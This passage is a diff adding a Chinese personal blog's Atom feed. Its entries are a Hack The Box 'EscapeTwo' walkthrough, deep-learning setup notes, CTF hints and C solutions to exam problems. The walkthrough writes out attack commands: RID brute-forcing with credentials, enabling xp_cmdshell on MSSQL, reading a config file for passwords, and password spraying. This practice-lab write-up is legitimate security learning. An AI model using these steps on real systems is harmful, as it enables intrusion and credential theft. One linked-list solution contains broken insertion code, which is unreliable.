@@ -1,0 +1,3808 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://fallingskies22.github.io</id>
+    <title>fallingskies</title>
+    <updated>2026-07-05T10:41:06.047Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://fallingskies22.github.io"/>
+    <link rel="self" href="https://fallingskies22.github.io/atom.xml"/>
+    <subtitle>&lt;h3&gt;想要去月球&lt;h3&gt;</subtitle>
+    <logo>https://fallingskies22.github.io/images/avatar.png</logo>
+    <icon>https://fallingskies22.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2026, fallingskies</rights>
+    <entry>
+        <title type="html"><![CDATA[[HTB] EscapeTwo]]></title>
+        <id>https://fallingskies22.github.io/post/htb-escapetwo/</id>
+        <link href="https://fallingskies22.github.io/post/htb-escapetwo/">
+        </link>
+        <updated>2025-04-11T20:33:34.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="user">User</h2>
+<p>端口探测，大概能判别出是一台域控服务器。</p>
+<pre><code>53/tcp 和 53/udp - domain：⽤于域名系统（DNS），⽤于将域名转换为对应的IP地址和反向操作
+88/tcp 和 88/udp - kerberos-sec：⽤于Kerberos认证协议，⽤于⽹络身份验证。
+135/tcp - msrpc：⽤于Microsoft远程过程调⽤（MSRPC），主要⽤于在⽹络上执⾏远程操作。
+139/tcp - netbios-ssn：⽤于NetBIOS会话服务，⽤于在⽹络上共享⽂件和打印机等资源。
+389/tcp 和 389/udp - ldap：⽤于轻型⽬录访问协议（LDAP），⽤于在⽹络上访问和维护⽬录信息。
+445/tcp - microsoft-ds：⽤于Microsoft的共享⽂件和打印机服务，也称为Server Message Block （SMB）。
+464/tcp - kpasswd5：⽤于Kerberos密码修改协议，⽤于在⽹络上修改Kerberos认证的密码。
+593/tcp - http-rpc-epmap：⽤于Microsoft远程过程调⽤（RPC）端⼝映射，⽤于远程通信。
+636/tcp - ldapssl：⽤于加密的轻型⽬录访问协议（LDAP），安全的LDAP通信。
+3268/tcp 和 3269/tcp - globalcatLDAP 和 globalcatLDAPssl：⽤于全局⽬录服务的LDAP通信，⽤ 于在多个域之间搜索和查找⽤户信息。
+5985/tcp - wsman：⽤于Web Services Management（WS-Management），⽤于远程管理和监视 Windows系统。
+9389/tcp - adws：⽤于Active Directory Web Services（ADWS），⽤于在⽹络上管理Active Directory域。
+470001/tcp - winrm Windows远程管理服务,⽤于Windows系统的远程管理和配置
+49664,49665,49666,49667,49685,49686,49689,49702,49723,49744,49808这些为动态随机端口
+</code></pre>
+<p>使用<a href="https://manesec.github.io/2023/10/28/2023/2023-10-rid-brute/">rid枚举</a>来获取账户名</p>
+<pre><code class="language-shell">python cme smb 10.10.11.51 -u &quot;rose&quot; -p &quot;KxEPkKe6R8su&quot; --rid-brute
+</code></pre>
+<p>筛选出SidTypeUser</p>
+<p>查看SMB共享文件<br>
+使用资源管理器访问<code>//10.10.11.51</code></p>
+<p>从 accounts.xlsx  中获得mssql账户</p>
+<p>使用<a href="https://github.com/maaaaz/impacket-examples-windows">impacket</a>中mssqlclient工具链接</p>
+<pre><code class="language-shell">.\mssqlclient.exe sequel.htb/sa:'MSSQLP@ssw0rd!'@10.10.11.51
+</code></pre>
+<pre><code class="language-sql">EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+</code></pre>
+<p>使用xp_cmdshell执行命令<br>
+当前用户为sql_svc，在users目录中发现ryan用户<br>
+在C:下发现SQL2019,cd进去发现ExpressAdv_ENU在该目录下发现sql-Configuration.INI</p>
+<pre><code class="language-sql"> EXEC xp_cmdshell 'powershell -Command &quot;type C:\\SQL2019\ExpressAdv_ENU\sql-Configuration.INI&quot;'
+</code></pre>
+<p>发现sql_svc账户密码WqSZAF6CysDQbGb3</p>
+<p>使用密码喷洒，发现该密码同样为ryan用户密码。</p>
+<p>使用ryan用户登录smb，即访问<code>//10.10.11.51</code>，查看文件\10.10.11.51\Users\ryan\Desktop\user.txt</p>
+<h2 id="参考文章">参考文章</h2>
+<p><a href="https://fdlucifer.github.io/2020/12/14/crackmapexec/">crackmapexec终极指南</a><br>
+<a href="https://zhuanlan.zhihu.com/p/25031519607">Windows渗透实战之EscapeTwo</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[《动手学深度学习》- 环境安装]]></title>
+        <id>https://fallingskies22.github.io/post/lesslessdong-shou-xue-shen-du-xue-xi-greatergreater-huan-jing-an-zhuang/</id>
+        <link href="https://fallingskies22.github.io/post/lesslessdong-shou-xue-shen-du-xue-xi-greatergreater-huan-jing-an-zhuang/">
+        </link>
+        <updated>2025-04-01T08:15:16.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="前言">前言</h2>
+<p>https://zh.d2l.ai/chapter_installation/index.html<br>
+https://www.zhihu.com/zvideo/1363284223420436480</p>
+<h2 id="步骤">步骤</h2>
+<h3 id="安装python">安装python</h3>
+<p>为了匹配教程环境<br>
+安装python3.8.5<br>
+https://www.python.org/downloads/release/python-385/</p>
+<h3 id="安装miniconda">安装miniconda</h3>
+<p>https://repo.anaconda.com/miniconda/Miniconda3-py38_4.9.2-Windows-x86_64.exe</p>
+<p>任务栏搜索Anaconda Prompt</p>
+<p>打开即可执行命令，如<code>conda list</code>。</p>
+<p>创建一个新的环境</p>
+<pre><code class="language-sh">conda create --name d2l python=3.8.5 -y
+</code></pre>
+<p>激活环境</p>
+<pre><code class="language-sh">conda activate d2l
+</code></pre>
+<p>(注意：后续命令都在conda中执行)</p>
+<h3 id="安装深度学习框架和d2l软件">安装深度学习框架和d2l软件</h3>
+<p>CPU版本pytorch</p>
+<pre><code class="language-sh">pip install torch==1.12.0
+pip install torchvision==0.13.0
+
+pip install d2l==0.17.6
+</code></pre>
+<p>下载d2l需要安装rust环境<br>
+参考https://blog.csdn.net/shi_yu123456/article/details/146301425</p>
+<p>下载报错<code>ERROR: Failed building wheel for pywinpty</code>，需安装C++构建工具。<br>
+参考https://blog.csdn.net/qq_40682931/article/details/145815327</p>
+<p>GPU版本pytorch</p>
+<p>使用</p>
+<pre><code class="language-sh">nvidia-smi
+</code></pre>
+<p>查看显卡驱动版本</p>
+<p>在https://pytorch.org/安装对应版本的包</p>
+<pre><code class="language-sh">pip3 install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu118
+</code></pre>
+<h3 id="下载d2l-notebook">下载D2L Notebook</h3>
+<p>https://zh-v2.d2l.ai/d2l-zh-2.0.0.zip</p>
+<h3 id="访问notebook">访问notebook</h3>
+<pre><code class="language-sh">jupyter notebook
+</code></pre>
+<p>需要切换到下载文件目录<br>
+使用<code>cd ..</code>切换到上层目录，只有切换到最上层才能切换磁盘。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[UTCTF - WEB - Writeup]]></title>
+        <id>https://fallingskies22.github.io/post/utctf/</id>
+        <link href="https://fallingskies22.github.io/post/utctf/">
+        </link>
+        <updated>2025-04-01T03:31:49.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="number-champion">Number Champion</h1>
+<p>修改对手为自己，可以刷elo分，刷到3000分就能遇到，geopy，修改lat和lon参数，根据返回的距离，获得geopy的准确地址，这里提示应该是要用python的geopy库，但是不会用😭</p>
+<h1 id="otp">OTP</h1>
+<p>按位依次爆破flag用户密码，显示的数字即是不匹配字母的ascii值和，当ascii值减少，说明当前位数字母匹配。</p>
+<h1 id="chat">Chat</h1>
+<p>参考https://blog.csdn.net/weixin_59166557/article/details/146382041</p>
+<p>使用条件竞争，创建log模式的频道。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[SCU]复试上机题库 - 2024]]></title>
+        <id>https://fallingskies22.github.io/post/chuan-da-fu-shi-shang-ji-ti-ku/</id>
+        <link href="https://fallingskies22.github.io/post/chuan-da-fu-shi-shang-ji-ti-ku/">
+        </link>
+        <updated>2025-03-08T04:26:33.000Z</updated>
+        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#0x01-%E9%9F%A9%E4%BF%A1%E7%82%B9%E5%85%B5">0x01 韩信点兵</a></li>
+<li><a href="#0x02-2%E7%9A%84%E5%B9%82%E6%AC%A1%E8%A1%A8%E7%A4%BA">0x02 2的幂次表示</a></li>
+<li><a href="#0x03-%E5%88%86%E6%95%B0%E6%B1%82%E5%92%8C">0x03 分数求和</a></li>
+<li><a href="#0x04-%E6%A0%85%E6%A0%8F%E4%B8%8A%E8%89%B2">0x04 栅栏上色</a></li>
+<li><a href="#0x05-%E5%8F%96%E5%BD%A9%E7%90%83%E7%9A%84%E5%8F%AF%E8%83%BD">0x05 取彩球的可能</a></li>
+<li><a href="#0x06-%E7%BB%9F%E8%AE%A1%E5%8D%95%E8%AF%8D%E4%B8%AA%E6%95%B0">0x06 统计单词个数</a></li>
+<li><a href="#0x07-%E6%95%B0%E7%BB%84%E9%81%8D%E5%8E%86">0x07 数组遍历</a></li>
+<li><a href="#0x08-%E5%8B%92%E8%AE%A9%E5%BE%B7">0x08 勒让德</a></li>
+<li><a href="#0x09-%E8%B0%81%E8%83%BD%E7%AC%91%E9%81%93%E6%9C%80%E5%90%8E">0x09 谁能笑道最后</a></li>
+<li><a href="#0x10-%E5%8D%95%E9%93%BE%E8%A1%A8%E9%93%BE%E8%A1%A8%E7%9A%84%E6%8E%92%E5%BA%8F">0x10 单链表（链表的排序）</a></li>
+<li><a href="#0x11-%E5%AF%BB%E6%89%BE%E5%8D%95%E8%BA%AB%E6%B1%AA">0x11 寻找单身汪</a></li>
+<li><a href="#0x12-%E4%B8%AD%E5%BF%8D%E8%80%83%E8%AF%95">0x12 中忍考试</a></li>
+<li><a href="#0x13-%E6%81%B6%E6%90%9E%E6%8C%87%E6%95%B0">0x13 恶搞指数</a></li>
+<li><a href="#0x14-%E5%A4%A7%E6%95%B4%E6%95%B0%E4%B9%98%E6%B3%95">0x14 大整数乘法</a></li>
+<li><a href="#0x15-pongo-light-the-lamp">0x15 Pongo light the lamp</a></li>
+<li><a href="#0x16-dna%E6%8E%92%E5%BA%8F">0x16 DNA排序</a></li>
+<li><a href="#0x17-%E6%BB%91%E9%9B%AA">0x17 滑雪</a></li>
+<li><a href="#0x18-%E4%BF%84%E7%BD%97%E6%96%AF%E6%96%B9%E5%9D%97">0x18 俄罗斯方块</a></li>
+<li><a href="#0x19-%E8%B7%AF%E5%BE%84%E8%A7%A3%E6%9E%90">0x19 路径解析</a></li>
+<li><a href="#0x20-%E7%81%AB%E8%BD%A6%E8%B4%AD%E7%A5%A8">0x20 火车购票</a></li>
+<li><a href="#0x21-%E6%A0%BC%E9%9B%B7%E7%A0%81">0x21 格雷码</a></li>
+<li><a href="#0x22-%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E6%89%A9%E5%B1%95">0x22 欧几里得扩展</a></li>
+<li><a href="#0x23-scu%E7%8C%AB%E6%8A%93%E8%80%81%E9%BC%A0">0x23 SCU猫抓老鼠</a></li>
+<li><a href="#0x24-%E4%B8%8D%E7%94%98%E5%BF%83%E7%9A%87%E5%90%8E">0x24 不甘心皇后</a></li>
+<li><a href="#0x25-%E7%82%89%E7%9F%B3%E4%BC%A0%E8%AF%B4">0x25 炉石传说</a></li>
+<li><a href="#0x26-%E5%B0%8F%E8%B4%9D%E5%BE%97%E6%B1%89%E8%AF%BA%E5%A1%94">0x26 小贝得汉诺塔</a></li>
+<li><a href="#0x27-%E5%AD%90%E6%96%87%E7%95%A5%E7%95%A5%E7%95%A5">0x27 子文略略略</a></li>
+<li><a href="#0x28-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%B1%82%E6%AC%A1%E9%81%8D%E5%8E%86">0x28 二叉树的层次遍历</a></li>
+<li><a href="#0x29-%E4%B8%89%E6%AC%A1%E7%82%B9%E5%87%BB%E5%88%A0%E9%99%A4">0x29 三次点击删除</a></li>
+<li><a href="#0x30-%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91">0x30 二叉排序树</a></li>
+</ul>
+</li>
+</ul>
+</p>
+<h2 id="0x01-韩信点兵">0x01 韩信点兵</h2>
+<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1741419053873.png" alt="" loading="lazy"></figure>
+<p>这题应该是想考中国剩余定理，但是代码实现比较困难，理论也比较复杂，直接使用暴力方法实现。</p>
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+
+int main(){
+	int n;
+	scanf(&quot;%d&quot;,&amp;n);
+	int i,j,m;
+	int flag=0;
+	while(n--){
+		flag=0;
+		scanf(&quot;%d %d %d&quot;, &amp;i,&amp;j,&amp;m);
+		for(int k=10;k&lt;=100;k++){
+			if(k%3==i&amp;&amp;k%5==j&amp;&amp;k%7==m){
+				flag = 1;
+				printf(&quot;%d\n&quot;,k);
+				break;
+			}
+		}
+		if(flag==0){
+			printf(&quot;Impossible\n&quot;);
+		}
+		
+		
+	}
+	return 0;
+}
+</code></pre>
+<h2 id="0x02-2的幂次表示">0x02 2的幂次表示</h2>
+<p>https://blog.csdn.net/u011815404/article/details/80275486</p>
+<p>主要考察递归思想</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+
+void calculate(int n,int step)
+{
+    if(n==0)
+        return;
+    calculate(n/2,step+1);
+    if(n%2)
+    {
+        if(n/2)
+            printf(&quot;+&quot;);
+        if(step==1)
+            printf(&quot;2&quot;);
+        else
+        {
+            printf(&quot;2(&quot;);
+            if(step==0){
+                printf(&quot;0&quot;);
+			}else{
+				calculate(step,0);
+			}
+            printf(&quot;)&quot;);
+        }
+    }
+}
+
+int main()
+{
+    int n;
+    scanf(&quot;%d&quot;,&amp;n);
+    calculate(n,0);
+    return 0;
+}
+</code></pre>
+<h2 id="0x03-分数求和">0x03 分数求和</h2>
+<p>https://blog.csdn.net/u011815404/article/details/80275484</p>
+<p>求最大公约数使用欧几里得算法（辗转相除法）</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+
+int a[20],b[20];
+int gcd(int a,int b)
+{
+    if(b==0)
+        return a;
+    return gcd(b,a%b);
+}
+int main()
+{
+    int n;
+    int cnt=0;
+    int numerator=0,denominator=1;
+    int divisor;
+    char s[20];
+ 
+    scanf(&quot;%d&quot;,&amp;n);
+    while(n--)
+    {
+        scanf(&quot;%d/%d&quot;,&amp;a[cnt],&amp;b[cnt]);
+        cnt++;
+    }
+    for(int i=0;i&lt;cnt;i++)
+        denominator*=b[i];
+    for(int i=0;i&lt;cnt;i++)
+        numerator=numerator+denominator*a[i]/b[i];
+ 
+    divisor=gcd(denominator,numerator);
+    denominator/=divisor;
+    numerator/=divisor;
+ 
+    if(denominator==1)
+        printf(&quot;%d&quot;,numerator);
+    else
+        printf(&quot;%d/%d&quot;,numerator,denominator);
+    return 0;
+}
+</code></pre>
+<h2 id="0x04-栅栏上色">0x04 栅栏上色</h2>
+<p>https://blog.csdn.net/itcodexy/article/details/117309618</p>
+<p>m个栅栏，n种颜色，同颜色相连不能大于等于k</p>
+<p>递归方法，大数运算会超时。<br>
+采用非递归动态规划的方法。</p>
+<p>使用long long int,防止大数溢出</p>
+<p>前k-1个没有限制，排列为<code>a[i] = n^(i)</code><br>
+第k个开始有限制,去除掉所有颜色相同的情况<code>a[i] = a[i-1]*n - n</code><br>
+第k+b个，因为<code>a[k+b-1]</code>个为前<code>k+b-1</code>个满足情况的所有排列，所以颜色相同的情况只能是因为加入了第<code>k+b</code>个，<br>
+前b个的排列为<code>a[b]</code>，后面k个颜色相同，且不能和前b个的最后一个值相同，故为<code>(n-1)</code><br>
+计算公式为<code>a[i] = a[i-1]*n - a[i-k]*(n-1);</code></p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+
+int main(){
+	int m,n,k;
+	int i;
+	scanf(&quot;%d %d %d&quot;,&amp;m,&amp;n,&amp;k);
+	long long int a[m]= {0};
+	a[0] = 1;
+	if(k&gt;n){
+		printf(&quot;Input Error&quot;);
+		return 0;
+	}
+	for(i=1;i&lt;k;i++){
+		a[i] = a[i-1]*n;
+	}
+	a[i] = a[i-1]*n - n;
+	i++;
+	for(;i&lt;=m;i++){
+		a[i] = a[i-1]*n - a[i-k]*(n-1);
+	}
+	printf(&quot;%lld&quot;,a[m]);
+	return 1;
+	
+}
+</code></pre>
+<h2 id="0x05-取彩球的可能">0x05 取彩球的可能</h2>
+<p>红球3个，白球3个，黑球6个，取n个球的种类</p>
+<p>暴力解法，直接遍历所有情况。</p>
+<pre><code class="language-c"> #include&lt;stdio.h&gt;
+ 
+ int main()
+ {
+    int cnt=0;
+    int i,j,k;
+    int m;
+    int n;
+    scanf(&quot;%d&quot;,&amp;m);
+    int red=3;
+    int white=3;
+    int black=6;
+    while(m)
+    {
+        scanf(&quot;%d&quot;,&amp;n);
+        for(i=0;i&lt;=red;i++)
+        {
+            for(j=0;j&lt;=white;j++)
+            {
+                for(k=0;k&lt;=black;k++)
+                {
+                    if(i+j+k==n)
+                    {
+                        cnt++;
+                    }
+                }
+            }
+        }
+        printf(&quot;%d\n&quot;,cnt);
+        cnt=0;
+        m--;
+    }
+    return 0;
+ }
+</code></pre>
+<h2 id="0x06-统计单词个数">0x06 统计单词个数</h2>
+<p>设置flag标志，当读取字符不为空格时置1，<br>
+读取字符为空格且flag=1时，视为有一个单词。</p>
+<p>最后换行时，可能少掉一个，需要对flag进行判断。</p>
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+ #include&lt;string.h&gt;
+ int main()
+ {
+    int flag=0;
+    char str;
+    int cnt=0;
+    while(str=getchar(),str!='\n')
+    {
+        if(str==' '&amp;&amp;flag==1)
+        {
+            cnt++;
+            flag=0;
+        }else
+        {
+            if(str!=' ')
+            {
+                flag=1;
+            }   
+        }
+    }
+    if(flag==1)
+    {
+        cnt++;
+    } 
+    printf(&quot;%d\n&quot;,cnt);
+    return 0;
+ }
+</code></pre>
+<h2 id="0x07-数组遍历">0x07 数组遍历</h2>
+<p>计算从矩阵的左上角 (0, 0) 到右下角 (m-1, n-1) 的最小路径和<br>
+(只能往右走，下走)<br>
+使用动态规划的方法</p>
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+ int A[10][10];
+ int m,n;
+ void Init();
+ void GetMin();
+ int main()
+ {
+    scanf(&quot;%d %d&quot;,&amp;m,&amp;n);
+    Init();
+    GetMin();
+    return 0;
+ }
+ void GetMin()
+ {
+    int i,j;
+    for(i=0;i&lt;m;i++)
+    {
+        for(j=0;j&lt;n;j++)
+        {
+        	if(i==0&amp;&amp;j==0){
+				continue;
+            }else if(i==0)
+            {
+                A[i][j]+=A[i][j-1];
+            }
+            else if(j==0)
+            {
+                A[i][j]+=A[i-1][j];
+            }
+            else
+            {
+                A[i][j] += (A[i - 1][j] &lt; A[i][j - 1]) ? A[i - 1][j] : A[i][j - 1];
+            }
+        }
+    }
+    printf(&quot;%d&quot;,A[m-1][n-1]);
+ }
+ void Init()
+ {
+    int i,j;
+    for(i=0;i&lt;m;i++)
+    {
+        for(j=0;j&lt;n;j++)
+        {
+            scanf(&quot;%d&quot;,&amp;A[i][j]);
+        }
+    }
+ }
+</code></pre>
+<h2 id="0x08-勒让德">0x08 勒让德</h2>
+<p>https://www.cnblogs.com/mjn1/p/8439926.html</p>
+<p>简单的递归，注意保留6位小数，处理n为负数时。</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+
+float p(int n,float x){
+	if(n==0){
+		return 1;
+	}else if(n==1){
+		return x;
+	}else{
+		return ((2*n-1)*x*p(n-1,x)-(n-1)*p(n-2,x))/n;
+	}
+}
+
+int main(){
+	int m;
+	int n;
+	float r,x;
+	scanf(&quot;%d&quot;,&amp;m);
+	while(m--){
+		scanf(&quot;%d %f&quot;,&amp;n,&amp;x);
+		if(n&lt;0){
+			printf(&quot;Input Error\n&quot;);
+			continue;
+		}
+		r = p(n,x);
+		printf(&quot;%.6f\n&quot;,r);
+	}
+	return 0;
+}
+</code></pre>
+<h2 id="0x09-谁能笑道最后">0x09 谁能笑道最后</h2>
+<p>其实就是约瑟夫环，直接使用数组形式模拟运行。</p>
+<p>常规方法是使用循环链表来实现。</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+
+int main(){
+	int n,k;
+	while(scanf(&quot;%d %d&quot;,&amp;n,&amp;k)!=EOF){
+		
+		if(n==0||k==0){
+			printf(&quot;End Of Input\n&quot;);
+			return 0;
+		}
+		if(n&lt;3||n&gt;1000||k&lt;3||k&gt;=n){
+			printf(&quot;Input Error\n&quot;);
+			continue;
+		}
+		
+		int a[n];
+		for (int i = 0; i &lt; n; i++){  
+	        a[i] = 1;
+	    }  
+		int flag=0;
+		int lose=0;
+		for(int i=0;;i=(i+1)%n){
+			if(a[i] == 1){
+				flag++;
+			}
+			
+			if(flag == k){
+				lose++;
+				if(lose == n){
+					printf(&quot;%d\n&quot;,i+1);
+					break;
+				}
+				a[i] = 0;
+				flag = 0;
+			}
+			
+		}
+		
+	}
+}
+</code></pre>
+<h2 id="0x10-单链表链表的排序">0x10 单链表（链表的排序）</h2>
+<p>描述<br>
+ <br>
+有n个学生成绩信息（包括学号、姓名、语文成绩、英语成绩、数学成绩、总成绩）要求算出总成绩、并按照总成绩排名输出，总成绩相同，按照姓名的字典序输出。<br>
+定义结构体入下：<br>
+struct student{<br>
+    char name[21];//姓名<br>
+    int sno;//学号<br>
+    int chinese;//语文<br>
+    int english;//英语<br>
+    int math;//数学<br>
+    int sum;//总成绩<br>
+    struct student *next;<br>
+};<br>
+ <br>
+输入<br>
+ <br>
+按照姓名，学号，语文成绩、英语成绩、数学成绩的顺序输入学生信息，各个数据之间空格隔开，当输入exit时输出截止。</p>
+<p>输出<br>
+学生信息排序之后按照样例的格式输出。<br>
+ <br>
+样例<br>
+ <br>
+输入	输出<br>
+zhangsan 2 85 88 90<br>
+lisi 3 89 99 100<br>
+exit	[{name:lisi,sum:288,sno:3},<br>
+{name:zhangsan,sum:263,sno:2}]<br>
+输出格式： 每次输出{name:xxx,sum:xxx,sno:x},后换行<br>
+ <br>
+提示<br>
+ <br>
+请从标准输入读入数据，将结果输出到标准输出。</p>
+<p>按序插入链表，保持链表的顺序性。</p>
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+#include&lt;string.h&gt;
+
+
+struct student{
+    char name[21];//姓名
+    int sno;//学号
+    int chinese;//语文
+    int english;//英语
+    int math;//数学
+    int sum;//总成绩
+    struct student *next;
+ };
+ 
+ 
+ void Output(struct student *head);
+ void Insert(struct student *head, struct student *p);
+ 
+ int main()
+ {
+    struct student *head=(struct student*)malloc(sizeof(struct student));
+    head-&gt;next=NULL;
+    while(1)
+    {
+        struct student *q=(struct student*)malloc(sizeof(struct student));
+        scanf(&quot;%s&quot;,q-&gt;name);
+        if(strcmp(q-&gt;name,&quot;exit&quot;)==0)
+        {
+            break;
+        }
+        scanf(&quot;%d %d %d %d&quot;,&amp;q-&gt;sno,&amp;q-&gt;chinese,&amp;q-&gt;english,&amp;q-&gt;math);
+        q-&gt;sum=q-&gt;chinese+q-&gt;english+q-&gt;math;
+        Insert(head,q);
+    }
+    Output(head);
+    return 0;
+ }
+ 
+void Output(struct student *head)
+ {
+    head=head-&gt;next;
+    if(head)
+    {
+        printf(&quot;[&quot;);
+    }
+    while(head)
+    {
+        printf(&quot;{name:%s,sum:%d,sno:%d}&quot;,head-&gt;name,head-&gt;sum,head-&gt;sno);
+        if(head-&gt;next!=NULL)
+        {
+            printf(&quot;,\n&quot;);
+        }else
+        {
+            printf(&quot;]&quot;);
+        }
+        head=head-&gt;next;
+    }
+ }
+void Insert(struct student *head,struct student *p){
+	
+	while(head-&gt;next != NULL){
+		if(head-&gt;next-&gt;sum &lt; p-&gt;sum){
+			break;
+		}else{
+			head = head-&gt;next;
+		}
+	}
+	
+    head-&gt;next = p;
+    p-&gt;next = head-&gt;next;
+}
+</code></pre>
+<h2 id="0x11-寻找单身汪">0x11 寻找单身汪</h2>
+<p>同leetcode求只出现一次的数字</p>
+<p>使用异或的方式。</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+
+int main(){
+	int n,k;
+	int r=0;
+	scanf(&quot;%d&quot;,&amp;n);
+	while(n--){
+		scanf(&quot;%d&quot;,&amp;k);
+		r ^= k;
+	}
+	
+	printf(&quot;%d&quot;,r);
+	return 0;
+}
+</code></pre>
+<h2 id="0x12-中忍考试">0x12 中忍考试</h2>
+<p>https://blog.csdn.net/qq_45703684/article/details/107756533</p>
+<p>注意如何读取字符串。以及使用strlen函数和fmin函数时调用的库。</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;math.h&gt;
+
+int main(){
+	int n,l,k,y;
+	scanf(&quot;%d %d %d %d&quot;,&amp;n,&amp;l,&amp;k,&amp;y);
+	int min = 0;
+	while(n--){
+		int sum = 0;
+		char s[100];
+		scanf(&quot;%s&quot;,s);
+		for(int i=0;i&lt;strlen(s);i++){
+			if(s[i] == 'A'){
+				sum+=l+k+y;
+			}else if(s[i] == 'B'){
+				sum+=2*l+k;
+			}else if(s[i] == 'C'){
+				sum+=3*l+3*k+2*y;
+			}
+		}
+		if(min == 0){
+			min = sum;
+		}
+		min = fmin(min,sum);
+	}
+	printf(&quot;%d&quot;,min);
+	return 0;
+}
+</code></pre>
+<h2 id="0x13-恶搞指数">0x13 恶搞指数</h2>
+<p>小明的朋友过生日，小明准备了一件礼物，不过小明想恶搞一下他的朋友，所以他准备了一堆盒子，其中有一个盒子里面装了礼物。盒子里面可以再放零个或者多个盒子。假设放礼物的盒子里不再放其他盒子。小明想让你帮他算出恶搞指数，即最少需要拆多少个盒子才能拿到礼物。</p>
+<p>输入<br>
+输入一个长度不大于1000,只包含（，）和 B 三种字符的字符串，用()表示一个盒子，B表示礼物。</p>
+<p>输出<br>
+输出恶搞指数，即最少需要拆多少个盒子才能拿到礼物。</p>
+<p>输入示例<br>
+(()(B))()()</p>
+<p>输出示例<br>
+2</p>
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+ 
+char Stack[1000];
+int main()
+{
+	int i;
+	char str[1000];
+	int rear=0;
+	scanf(&quot;%s&quot;,str);
+	for(i=0;i&lt;strlen(str);i++){
+	    if(str[i]=='(')
+	    {
+	        Stack[rear]=str[i];
+	        rear=rear+1;
+	    }
+	    if(str[i]==')')
+	    {
+	        rear=rear-1;
+	    }
+	    if(str[i]=='B')
+	    {
+	        printf(&quot;%d&quot;,rear);
+	        break;
+	    }
+	}
+	return 0;
+}
+</code></pre>
+<p>把左括号看成盒盖，右括号看成盒底。<br>
+最快的方式，直接拿盒盖就找到。<br>
+当拿到盒底时，说明我们开到一个空盒，需要减去。</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int main(){
+	char s[1000];
+	scanf(&quot;%s&quot;,s);
+	int num = 0;
+	for(int i=0;i&lt;strlen(s);i++){
+		if(s[i] == '('){
+			num++;
+		}
+		if(s[i] == ')'){
+			num--;
+		}
+		if(s[i] == 'B'){
+			printf(&quot;%d&quot;,num);
+			return 0;
+		}
+	}
+}
+</code></pre>
+<h2 id="0x14-大整数乘法">0x14 大整数乘法</h2>
+<figure data-type="image" tabindex="2"><img src="https://fallingskies22.github.io/post-images/1741776838611.png" alt="" loading="lazy"></figure>
+<p>以字符串形式读入两乘数。<br>
+使用ascii码转化为int数组。</p>
+<p>两数组，逐项相乘，同次的结果放在一起。</p>
+<p>将结果中每位超过10的进行进位。<br>
+从尾向前第一个不为0的数开始输出</p>
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+#define Max 100000
+
+
+int main()
+{
+    char a[Max],b[Max];
+    int c[Max],d[Max],e[Max];
+    int a1,a2;
+    while(scanf(&quot;%s %s&quot;,a,b)!=EOF)
+    {
+        memset(c,0,sizeof(c));
+        memset(d,0,sizeof(d));
+        memset(e,0,sizeof(e));
+        a1=strlen(a);
+        a2=strlen(b);
+ 
+        int x=0;
+        int i,j;
+        for( i=a1-1; i&gt;=0; i--)
+        {
+            c[x]=a[i]-48;
+            x++;
+        }
+ 
+        x=0;
+        for( i=a2-1; i&gt;=0; i--)
+        {
+            d[x]=b[i]-48;
+            x++;
+        }
+ 
+        for( i=0; i&lt;a1; i++)
+        {
+            for( j=0; j&lt;a2; j++)
+            {
+                e[i+j]+=(c[i]*d[j]);
+            }
+        }
+ 
+        for( j=0; j&lt;Max; j++)
+        {
+            if(e[j]&gt;=10)
+            {
+                e[j+1]+=e[j]/10;
+                e[j]%=10;
+            }
+        }
+        for(i=Max-1; i&gt;=0; i--)
+        {
+            if(e[i]!=0)
+                break;
+        }
+        for(;i&gt;=0; i--)
+        {
+            printf(&quot;%d&quot;,e[i]);
+        }
+        printf(&quot;\n&quot;);
+    }
+    return 0;
+}
+
+</code></pre>
+<h2 id="0x15-pongo-light-the-lamp">0x15 Pongo light the lamp</h2>
+<p>有 k 盏灯和 k 只喜欢拉灯的猩猩，他们分别编号为 1 2 3... k，k 盏灯排成一排，每个猩猩都从这k盏灯前面走过，并且拉一下编号是他倍数的灯，比如编号为3的猩猩会拉编号为 3 6 9...的灯。开始的时候每盏灯是关着的，每拉一下灯的状态就改变一下（亮暗之间），问最后有多少盏灯是亮的。猩猩和灯的编号都是顺序的。<br>
+输入格式：输入 k (k &gt;= 1 &amp;&amp; k &lt;= 2,000,000)，当 k 为 0 时输入结束，请不要对这种情况输出任何结 果。<br>
+输出格式：输出最后亮着的灯的数目。</p>
+<p>输入样例：<br>
+5<br>
+4<br>
